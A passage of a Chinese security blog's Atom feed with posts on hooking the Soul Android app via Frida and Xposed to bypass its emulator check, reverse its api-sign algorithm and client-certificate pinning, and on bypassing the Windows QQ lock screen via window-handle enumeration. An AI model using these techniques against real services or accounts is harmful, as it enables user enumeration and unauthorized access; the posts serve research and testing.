class="line">openssl pkcs12 -export -inkey client.key -in client.crt -out soulclient.pfx</span><br></pre></td></tr></table></figure><blockquote><p>证书的位置位于资源文件assets中。</p></blockquote><p><img src="09.png" alt=""></p><blockquote><p>标记的1处输入的是soul证书的密码，2和3为证书导入浏览器自己设置的密码，这里为123456</p></blockquote><p>然后导入浏览器，重新访问<a href="https://account.soulapp.cn/" target="_blank" rel="noopener">https://account.soulapp.cn/</a></p><p><img src="10.png" alt=""></p><p>选择证书后确定。</p><p><img src="https://i.imgur.com/63SKzUi.png" alt=""></p><p>根据页面显示内容可以发现此时导入证书后可以正常访问。</p><h4 id="b-利用程序完成认证"><a href="#b-利用程序完成认证" class="headerlink" title="b)利用程序完成认证"></a>b)利用程序完成认证</h4><p>利用程序的话，参考<code>cn.soulapp.android.api.e.a()</code>方法，进行证书的操作。</p><p><img src="11.png" alt=""></p><p>精简之后主要代码如下：</p><p><img src="12.png" alt=""></p><p>然后利用httpclient进行http请求。</p><p>当访问不加证书的效果：</p><p><img src="13.png" alt=""></p><p>使用证书的结果：</p><p><img src="14.png" alt=""></p><blockquote><p>由于这是这是之前的数据包，所以已经过期，再次使用需要更换时间戳和签名，但结果成功的。</p></blockquote><h4 id="c-利用抓包工具"><a href="#c-利用抓包工具" class="headerlink" title="c)利用抓包工具"></a>c)利用抓包工具</h4><p>使用抓包工具，这里以burp为例。</p><p>未导入证书抓包结果：</p><p><img src="15.png" alt=""></p><p>提示400错误，我们在burp中导入证书</p><p><img src="16.png" alt=""></p><p>选择证书并输入密码。</p><p><img src="17.png" alt=""></p><p>证书导入成功。</p><p><img src="18.png" alt=""></p><p>再次抓包</p><p><img src="19.png" alt=""></p><p>已经可以正常抓取了。</p><p>当然使用其他方法也是可行的，这里就不再列举了。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>本文主要是为了解决APP与服务器之间的双向证书认证问题，没有太多的技巧，主要就是证书的使用。如果服务器采用了双向认证，那么一般在APP中有证书和证书密码的存在，找到之后导入抓包工具即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;在《&lt;a href=&quot;https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/&quot;&gt;安卓APP测试之HOOK大法-Frida篇&lt;/a&gt;》文章中有一个双向证书认证没详细说明，经过&lt;strong&gt;孔已己&lt;/strong&gt;的提示，现在补充一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android技术" scheme="https://fuping.site/categories/Android%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="SoulAPP" scheme="https://fuping.site/tags/SoulAPP/"/>
    
      <category term="双向证书" scheme="https://fuping.site/tags/%E5%8F%8C%E5%90%91%E8%AF%81%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>安卓APP测试之HOOK大法-Xposed篇</title>
    <link href="https://fuping.site/2019/01/28/Xposed-Hook-SoulApp/"/>
    <id>https://fuping.site/2019/01/28/Xposed-Hook-SoulApp/</id>
    <published>2019-01-28T09:21:56.000Z</published>
    <updated>2019-01-29T02:03:00.394Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p><a href="https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/">安卓APP测试之HOOK大法-Frida篇</a>是基于Frida来实现HOOK，对于部分用户来说，一方面手机ROOT会带来一些风险，另一方面虽然愿意承担风险但是手机无法ROOT。这就需要采用另外一种方法–利用Xposed来进行HOOK。安装VirtualXposed之后，并不需要对手机进行ROOT，也可以来运行Xposed模块进行HOOK。</p><a id="more"></a><p><a href="https://github.com/android-hacker/VirtualXposed" target="_blank" rel="noopener">VirtualXposed</a>是基于<a href="https://github.com/asLody/VirtualApp" target="_blank" rel="noopener">VirtualApp</a> 和 <a href="https://github.com/tiann/epic" target="_blank" rel="noopener">epic</a> 在<strong>非ROOT</strong>环境下运行Xposed模块的实现（支持5.0~9.0)，就像它的介绍那样，<code>Use Xposed with a simple APP, without needing to root, unlock the bootloader, or flash a system image.</code>可以运行Xposed，不需要root，也不需要BL解锁和刷机。</p><h2 id="0x02-环境准备"><a href="#0x02-环境准备" class="headerlink" title="0x02 环境准备"></a>0x02 环境准备</h2><p>手机还是采用魅族Mx4，关闭ROOT权限。</p><p><img src="01.png" alt=""></p><p><img src="02.png" alt=""></p><p>下载并安装VirtualXposed，下载地址：<a href="https://github.com/android-hacker/VirtualXposed/releases" target="_blank" rel="noopener">https://github.com/android-hacker/VirtualXposed/releases</a></p><p>安装：</p><p><code>adb install VirtualXposed_0.16.1.apk</code></p><p>安装VirtualXposed之后，然后把手机上的APP安装到VirtualXposed上。</p><p><img src="03.png" alt=""></p><blockquote><p>由于VirtualXposed自带Xposed，这里我们只将需要的APP安装上去即可。</p></blockquote><p>开发Xposed模块采用的是Android Studio。</p><p>新建一个APP项目，添加依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">provided &#39;de.robv.android.xposed:api:82&#39;</span><br><span class="line">provided &#39;de.robv.android.xposed:api:82:sources&#39;</span><br></pre></td></tr></table></figure><p><img src="04.png" alt=""></p><p>新建一个Main类，并实现<code>IXposedHookLoadPackage</code>接口。</p><p><img src="05.png" alt=""></p><p>在src/main下新建一个<code>Assets Folder</code>。</p><p><img src="06.png" alt=""></p><p>并在其中新建一个名称为<code>xposed_init</code>的文件，内容是实现HOOK的类，这里是<code>com.fuping.soulhook.Main</code>。</p><p>在AndroidManifest.xml中指定模块的名称</p><p><img src="07.png" alt=""></p><p>环境准备好了，下面就是模块的开发和HOOK了。</p><h2 id="0x03-利用Xposed进行HOOK"><a href="#0x03-利用Xposed进行HOOK" class="headerlink" title="0x03 利用Xposed进行HOOK"></a>0x03 利用Xposed进行HOOK</h2><p>由于上篇文章已经分析过了，这里就不进行分析了，打开app会提示<code>SoulApp 暂不支持模拟器，请稍后再试~</code>。我们需要对<code>cn.soulapp.android.utils.j.e()</code>进行HOOK，令其返回为false。</p><p>上面模块的框架已经搭好了，直接写HOOK代码，主要代码如下：</p><p><img src="08.png" alt=""></p><blockquote><p>注意，利用Android Studio进行模块的编写时，需要禁用<code>Instant Run</code>(<code>File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Instant Run</code>)。</p></blockquote><p>然后打包安装。再利用VirtualXposed将编写的HOOK模块添加到VirtualXposed中。</p><p><img src="09.png" alt=""></p><p>查看安装的app</p><p><img src="10.png" alt=""></p><p>然后在VirtualXposed中打开Xposed Installer，在模块中勾选soulHook。</p><p><img src="11.png" alt=""></p><p>重启VirtualXposed。</p><blockquote><p>Xposed模块每次修改都需要重启手机，在VirtualXposed中时，只需重启VirtualXposed即可，而且速度极快。</p></blockquote><p>在VirtualXposed中打开soulapp，并查看logcat输出内容。</p><p><img src="12.png" alt=""></p><p>APP可以正常进入，说明HOOK成功。</p><p>剩下的也比较简单了，例如查看<code>com.gongjiao.rr.tools.f.b</code>参数。</p><p>主要代码：</p><p><img src="13.png" alt=""></p><p>运行输入手机号查看Log信息：</p><p><img src="14.png" alt=""></p><p>也是毫无问题可以获取到参数的内容的。</p><p>获取到参数内容后，根据上篇文章的算法的分析，就可以自己构造进行加密了。</p><p>例如利用Python来实现，可以批量探测用户是否注册。</p><p><img src="15.png" alt=""></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本来Frida和Xposed是作为一篇文章的，但是由于篇幅问题分成了两篇。这两篇文章主要通过两种方式来进行HOOK，主要是为了说明HOOK的好处，没有说是为了对比哪个好哪个不好的。不过通过测试，如果安装了VirtualXposed，Xposed应该还是略胜一筹吧。第一点无需ROOT即可运行，第二点是解决了需要重启手机的麻烦（利用VirtualXposed可以秒重启），第三点就是携带方便了。不过各有各的好处，根据自己的习惯选择。也可以先用Frida进行HOOK，毕竟测试比较方便，然后最后移植到Xposed上。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/&quot;&gt;安卓APP测试之HOOK大法-Frida篇&lt;/a&gt;是基于Frida来实现HOOK，对于部分用户来说，一方面手机ROOT会带来一些风险，另一方面虽然愿意承担风险但是手机无法ROOT。这就需要采用另外一种方法–利用Xposed来进行HOOK。安装VirtualXposed之后，并不需要对手机进行ROOT，也可以来运行Xposed模块进行HOOK。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android技术" scheme="https://fuping.site/categories/Android%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="安卓Hook" scheme="https://fuping.site/tags/%E5%AE%89%E5%8D%93Hook/"/>
    
      <category term="SoulAPP" scheme="https://fuping.site/tags/SoulAPP/"/>
    
      <category term="Xposed" scheme="https://fuping.site/tags/Xposed/"/>
    
  </entry>
  
  <entry>
    <title>安卓APP测试之HOOK大法-Frida篇</title>
    <link href="https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/"/>
    <id>https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/</id>
    <published>2019-01-25T14:17:11.000Z</published>
    <updated>2019-01-28T09:25:42.442Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>一般测试APP都是先设置代理，然后抓包进行测试。但是大多数情况下，抓取的数据包都含有参数校验，一旦修改其中一个参数之后，就会返回签名错误。</p><a id="more"></a><p>例如：</p><p><img src="01.png" alt=""></p><p>还有的有时间校验，当过去某一时间段后，该数据包就失效了。</p><p><img src="02.png" alt=""></p><p>因此如果想要去重放或者修改数据包进行FUZZ的话，就要弄清楚其中的加密sign值的算法。</p><p>本文以某app老版本为例(仅为技术研究)，主要目的是利用Frida进行HOOK进而去获取其api-sign的加密算法。</p><h2 id="0x02-环境准备"><a href="#0x02-环境准备" class="headerlink" title="0x02 环境准备"></a>0x02 环境准备</h2><p>这里手机采用魅族X4，刷了CM13.0，开启ROOT权限。</p><p>APP版本为v3.0.10，下载地址：<a href="https://www.wandoujia.com/apps/cn.soulapp.android/history_v18080100" target="_blank" rel="noopener">https://www.wandoujia.com/apps/cn.soulapp.android/history_v18080100</a></p><p>然后就是Frida环境的准备了。</p><p><strong>Frida</strong>是一款基于Python + JavaScript 的Hook与调试框架，在Android\Linux\Windows等平台均能使用。这里我们以<strong>Windows</strong>来对Android应用程序进行Hook。Frida的官网地址是：<a href="https://www.frida.re/" target="_blank" rel="noopener">https://www.frida.re。</a></p><p>安装方法也很简单：<code>pip install frida-tools</code>。</p><p>手机开启开发者模式，并开启USB调试。</p><p>下载frida-server，下载地址为：<a href="http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。" target="_blank" rel="noopener">http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。</a></p><p>上传到手机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server /data/<span class="built_in">local</span>/tmp/</span><br></pre></td></tr></table></figure><p>添加权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@mx4:/ <span class="comment">#chmod 777 frida-server</span></span><br></pre></td></tr></table></figure><p>手机上运行frida-server，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@mx4:&#x2F; #.&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server</span><br></pre></td></tr></table></figure><p>端口转发,电脑上运行如下命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><p>环境准备好了，就开始对APP进行测试。</p><h2 id="0x03-利用Frida进行HOOK"><a href="#0x03-利用Frida进行HOOK" class="headerlink" title="0x03 利用Frida进行HOOK"></a>0x03 利用Frida进行HOOK</h2><p>安装后打开APP。</p><p><img src="03.png" alt=""></p><p>发现APP闪退，并提示<code>SoulApp 暂不支持模拟器，请稍后再试~</code>。</p><p>用jadx打开apk文件，搜索关键字<code>模拟器</code>。</p><p><img src="04.png" alt=""></p><p>只有一处，我们点进去。</p><p><img src="05.png" alt=""></p><p>其中有个判断，如果<code>cn.soulapp.android.utils.j.e()</code>为true，则提示不支持模拟器，并退出程序。点进这个方法查看。</p><p><img src="06.png" alt=""></p><p>其中有多个判断，如果一个为true，则返回true，最简单有效的方法就是hook，直接令其返回为false。使用Frida进行hook，代码如下：</p><p><img src="07.png" alt=""></p><p>运行后，发现再次打开app，可以顺利进入了。</p><p><img src="08.png" alt=""></p><p>输入手机号，点击确定。</p><p><img src="09.png" alt=""></p><p>提示<code>网络错误</code>，这是因为使用了代理，所以报错，但是有数据包的。可以暂时先不管这里。我们目的是获取sign值的加密算法。这里是获取api-sign的加密算法。</p><p>数据包内容</p><p><img src="10.png" alt=""></p><p>数据包中有<code>api-sign</code>，所以直接利用jadx搜索<code>api-sign</code>。</p><p><img src="11.png" alt=""></p><p>发现在cn.soulapp.android.api.b.b.b()中有调用，进入查看。</p><p><img src="12.png" alt=""></p><p>api-sign值的获取调用了<code>cn.soulapp.android.api.b.c.a</code>方法。</p><p><img src="13.png" alt=""></p><p>这里是创建了一个stringBuilder，经过拼接后，调用com.gongjiao.rr.tools.f.b进行sha1加密，并转换为大写。我们需要知道cn.soulapp.android.api.b.c.a三个参数的值是什么。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aVar.b(<span class="string">"api-sign"</span>, c.a(aaVar, replaceAll, currentTimeMillis));</span><br></pre></td></tr></table></figure><p>根据代码可以推测，第一个参数<code>aaVar</code>是类<code>okhttp3.Request</code>的实例化；</p><p>第二个参数<code>replaceAll</code>是获取的UUID去除中间的<code>&quot;-&quot;</code>；</p><p>第三个参数是当前时间戳减去<code>cn.soulapp.android.api.a.a()</code>。这个值是从<code>soul_share.xml</code>中读取<code>ApiConstants_timeDiff</code>的值，查看<code>soul_share.xml</code>发现内容为空。</p><p><img src="14.png" alt=""></p><p>所以第三个参数为当前的时间戳。</p><p>查看<code>cn.soulapp.android.api.b.c.a</code>方法，前半部分是对<code>aaVar</code>进行操作，大概是获取请求的路径，然后对参数进行拼接。</p><p>看后半部分的代码：</p><p><img src="15.png" alt=""></p><p>这里第71行中的<code>UTDevice.getUtdid(SoulApp.b())</code>为设备号，即数据包里面的<code>device-id</code>；</p><p>第72行的a.j为固定值，这里为10000003；</p><p>第73行这个值需要获取，可以用hook获取；</p><p>第74行a(j)是将传入的时间戳(第三个参数)进行转换；</p><p>第75行是拼接了传入的第二个参数；</p><p>第78行拼接了固定值3010；</p><p>然后第80行调用com.gongjiao.rr.tools.f.b对stringBuilder进行加密，并转换为大写。</p><p>可以通过hook的方法直接获取<code>cn.soulapp.android.api.b.c.a</code>和<code>com.gongjiao.rr.tools.f.b</code>的参数。</p><p>主要代码：</p><p><img src="16.png" alt=""></p><blockquote><p>由于<code>cn.soulapp.android.api.b.c</code>中有多个a方法，所以这里用了重载，指明参数类型来确定是哪个方法。</p></blockquote><p>运行效果</p><p><img src="17.png" alt=""></p><p>知道了加密算法以及参数，就可以自己实现加密获取api-sign了，如下所示：</p><p><img src="18.png" alt=""></p><p>api-sign值可以获取了，我们试一下能否利用。由上面知道代理抓包时数据包返回400，经过查看代码是可以解决这个问题的。这里不详细说明。</p><p><img src="19.png" alt=""></p><p>发现该方法获取api-sign是可行的。</p><h2 id="0x04-其他问题"><a href="#0x04-其他问题" class="headerlink" title="0x04 其他问题"></a>0x04 其他问题</h2><h3 id="1-不进行hook获取参数的内容或者查看调用堆栈的方法"><a href="#1-不进行hook获取参数的内容或者查看调用堆栈的方法" class="headerlink" title="1.不进行hook获取参数的内容或者查看调用堆栈的方法"></a>1.不进行hook获取参数的内容或者查看调用堆栈的方法</h3><p>可以通过动态调试的方法进行查看。</p><p>首先将apk反编译为smali文件，然后IDEA安装smalidea插件。下载地址：<a href="https://bitbucket.org/JesusFreke/smali/downloads/" target="_blank" rel="noopener">https://bitbucket.org/JesusFreke/smali/downloads/</a></p><p>反编译的命令如下：</p><p><code>java -jar baksmali-2.2.2.jar d 106_3ce8a91b116f3ca28175affa3d12083f.apk -o SoulApp3010/src</code></p><p>然后导入到idea中</p><p><img src="20.png" alt=""></p><p>然后在需要查看的地方下断点。</p><p>例如在<code>cn.soulapp.android.api.b.c.a</code>下断点</p><p><img src="21.png" alt=""></p><p>打开Run/Debug Configurations，添加一个远程调试，端口8700</p><p>运行app，然后在Android Device Monitor中选中</p><p><img src="22.png" alt=""></p><p>打开调试按钮，点击手机上的确定，进入调试。</p><p><img src="23.png" alt=""></p><h3 id="2-加密的算法在so文件中"><a href="#2-加密的算法在so文件中" class="headerlink" title="2.加密的算法在so文件中"></a>2.加密的算法在so文件中</h3><p>简单的方法就是获取调用so中方法的参数，然后自己写一个app，调用其so文件。</p><p>如果有判断的话，可以修改so文件达到可以调用的目的。</p><p><img src="24.png" alt=""></p><p>如上所示，该so文件有判断，如果isInMyAPP为false，则会退出，返回null。</p><p>我们可以修改<code>CMP R0,#0</code>为<code>CMP R0,#1</code>来绕过该限制。</p><p>修改后</p><p><img src="25.png" alt=""></p><p>更深入的就是对so文件进行分析，找到其中的加密算法。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>Frida不仅可以用于hook java层，也可以进行native层的hook。利用Frida进行hook时，要求需要使用已ROOT的手机，对于手机无法ROOT的，安装<a href="https://github.com/android-hacker/VirtualXposed" target="_blank" rel="noopener">VirtualXposed</a>后使用Xposed框架也可以进行HOOK。这里就不说明了，有兴趣的可以去试一试。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;一般测试APP都是先设置代理，然后抓包进行测试。但是大多数情况下，抓取的数据包都含有参数校验，一旦修改其中一个参数之后，就会返回签名错误。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android技术" scheme="https://fuping.site/categories/Android%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="安卓Hook" scheme="https://fuping.site/tags/%E5%AE%89%E5%8D%93Hook/"/>
    
      <category term="Frida" scheme="https://fuping.site/tags/Frida/"/>
    
      <category term="SoulAPP" scheme="https://fuping.site/tags/SoulAPP/"/>
    
  </entry>
  
  <entry>
    <title>Windows版本QQ锁定可被绕过</title>
    <link href="https://fuping.site/2018/11/19/QQ-Lock-bypass/"/>
    <id>https://fuping.site/2018/11/19/QQ-Lock-bypass/</id>
    <published>2018-11-19T14:11:33.000Z</published>
    <updated>2018-11-22T01:00:02.885Z</updated>
    
    <content type="html"><![CDATA[<p>在使用某抢票软件的时候，由于要设置抢票成功后的通知，就用了QQ通知。结果发现当QQ在锁定时，也可以获取到QQ的控制面板进行操作，竟然绕过了QQ的锁定，于是就去尝试如何实现QQ锁定的绕过。</p><a id="more"></a><p><img src="640.png" alt="虚线阴影分割线"></p><h1 id="情景还原"><a href="#情景还原" class="headerlink" title="情景还原"></a>情景还原</h1><hr><p>首先演示一下如何使用抢票软件进行QQ锁定的绕过。这里以最新版本<a href="https://dldir1.qq.com/qqfile/qq/QQ9.0.7/24121/QQ9.0.7.24121.exe" target="_blank" rel="noopener">9.0.7（24121）</a>为例。下载后正常安装。</p><p><img src="01.png" alt="1542639823372"></p><p>安装后查看版本。</p><p><img src="02.png" alt="1542640660482"></p><p>将QQ锁定，然后打开软件，选择QQ通知，点击“获取聊天窗口”，此时会进行QQ窗体的加载，然后在“要发送的窗口”下拉框会显示一个随机字符串，点击“测试发送”按钮，会发现QQ控制面板弹出。</p><p><img src="03.png" alt="1542641095561"></p><p>而且是可以进行未锁定前的所有功能。如发送和接收消息，如图所示。</p><p><img src="04.png" alt="1542720813184"></p><h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><p>刚开始的想法是首先获取QQ窗口的句柄，然后再利用句柄进行显示与隐藏。</p><h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一"></a>尝试一</h2><p>这里采用的是精易编程助手来获取句柄，当qq处于非锁定状态，获取QQ窗体句柄后，可以利用句柄对QQ进行隐藏或显示，即使把QQ锁定，也可以进行隐藏或者显示。</p><p><img src="05.gif" alt="1542722213724"></p><p>但是当QQ隐藏后，此时再获取句柄后，无法绕过QQ的锁定。这时候获取的句柄为QQ锁定状态的句柄。</p><p><img src="06.gif" alt="1542722213724"></p><blockquote><p>该方法只能对未锁定的QQ进行操作，锁定后就无法获取控制面板句柄了，因此该方法行不通。</p></blockquote><h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二"></a>尝试二</h2><p>放弃了精易编程助手，采用更专业的工具spy++。找到句柄后发现标题为一串随机的字符串，与抢票工具获取聊天窗口中标题一样。</p><p><img src="07.png" alt="1542724530787"></p><p>猜测需要最终需要获取的句柄就是这个，句柄对应的十六进制为504BE，然后调用windows api进行窗口的显示和隐藏。</p><p>显示窗口<code>ShowWindow (句柄, 1)</code>，隐藏窗口<code>ShowWindow (句柄, 0)。</code></p><p>效果如图所示。</p><p><img src="08.gif" alt="1542724530787"></p><blockquote><p>这样虽然能够满足，但是却不够智能，无法自动获取句柄，需要借助其他工具去寻找句柄，因此放弃。</p></blockquote><h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三"></a>尝试三</h2><p>本次测试中走了两条“弯路”，在这里简要说明一下，就不再附详细的过程了。某次发现使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">临时_句柄&#x3D;FindWindowA (“TXGuiFoundation”, “TXMenuWindow”)</span><br><span class="line">句柄&#x3D;窗口_取父句柄 (窗口_取父句柄 (临时_句柄))</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">临时_句柄&#x3D;FindWindowA (“TXGuiFoundation”, “”)</span><br><span class="line">句柄&#x3D;窗口_取父句柄 (临时_句柄)</span><br></pre></td></tr></table></figure><p>可以获取到QQ锁定时控制面板的句柄。如图所示</p><p><img src="09.gif" alt="1542724530787"></p><blockquote><p>但这些只是概率事件，多数情况下还是不行的。即使可以使用这两种方法，但是这两种方法获取的都是一个句柄，当有两个QQ时，就无法同时获取两个句柄了，所以该方法不可取。</p></blockquote><p>由于QQ处于锁定时，窗口标题为随机的字符串，所以无法使用FindWindowA这种方法了。</p><h2 id="尝试四之最终实现"><a href="#尝试四之最终实现" class="headerlink" title="尝试四之最终实现"></a>尝试四之最终实现</h2><p>此时想到另外一个思路，遍历屏幕上所有的顶层窗口，然后根据条件进行筛选。</p><p>这里用的Java来实现，操作Windows API采用了<a href="https://github.com/java-native-access/jna" target="_blank" rel="noopener">JNA</a>。</p><blockquote><p>JNA的全称是Java Native Access，你只要在一个java接口中描述本地库中的函数与结构， JNA将在运行期动态访问本地库，自动实现Java接口到本地库函数的映射。</p></blockquote><p>使用maven加入所需的依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.java.dev.jna<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jna<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.java.dev.jna<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jna-platform<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>枚举屏幕上所有的顶层窗口采用的是<a href="https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-" target="_blank" rel="noopener">EnumWindows</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">EnumWindows</span><span class="params">(WinUser.WNDENUMPROC lpEnumFunc,</span></span></span><br><span class="line"><span class="function"><span class="params">                    Pointer data)</span></span></span><br></pre></td></tr></table></figure><p>该函数枚举屏幕上所有的顶层窗口，并将窗口句柄传送给应用程序定义的回调函数。回调函数返回FALSE将停止枚举，否则EnumWindows函数继续到所有顶层窗口枚举完为止。</p><p>参数：lpEnumFunc - 指向应用程序定义的回调函数的长指针。</p><p>参数：data - 指定要传递给回调函数的应用程序定义的值。</p><p>代码实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User32.INSTANCE.EnumWindows(new WinUser.WNDENUMPROC() &#123;</span><br><span class="line"></span><br><span class="line">    public boolean callback(WinDef.HWND hwnd, Pointer pointer) &#123;</span><br><span class="line">        System.out.println(hwnd);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,null);</span><br></pre></td></tr></table></figure><p><img src="10.png" alt="1542765670181"></p><p>此时获取的时所有顶层窗口的句柄，剩下的就是去如何进行过滤，留下所需的句柄。</p><p><img src="11.png" alt="1542766813276"></p><p>通过对比发现，可以用窗口样式进行区分。当QQ锁定时（或QQ未锁定且最小化时），对应的窗口样式为860C0000（十进制为2248933376）。</p><p>下面为QQ锁定时的样式。</p><p><img src="12.png" alt="1542766908014"></p><p>通过查询API，可以用<code>User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE)</code>来获取窗口样式。然后通过这种方法进行过滤，当该值为2248933376，则认为对应的hwnd为QQ控制面板的句柄。</p><p>主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User32.INSTANCE.EnumWindows(<span class="keyword">new</span> WinUser.WNDENUMPROC() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callback</span><span class="params">(WinDef.HWND hwnd, Pointer pointer)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2248933376L</span>)&#123;</span><br><span class="line">                    System.out.println(hwnd);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p><img src="13.png" alt="1542767244090"></p><p>可以看到成功获取了QQ锁定时控制面板的句柄。有了句柄，就可以进行之前的操作了，如显示与隐藏。</p><blockquote><p>当QQ未锁定时，QQ弹出时对应的窗口样式为960c0000（十进制为2517368832）。</p></blockquote><p><img src="14.png" alt="1542768137649"></p><p>此时就可以先通过<code>EnumWindows</code>枚举所有的窗口，然后再使用<code>GetWindowLongPtr(hwnd,User32.GWL_STYLE)</code>获取窗口样式进行匹配，匹配到所需的窗口。</p><p>这里将QQ锁定和未锁定的情况都考虑进去，然后获取QQ控制面板的句柄。之后通过<code>GetWindowText</code>获取窗口的标题，再使用<code>ShowWindow</code>进行隐藏与显示操作。主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 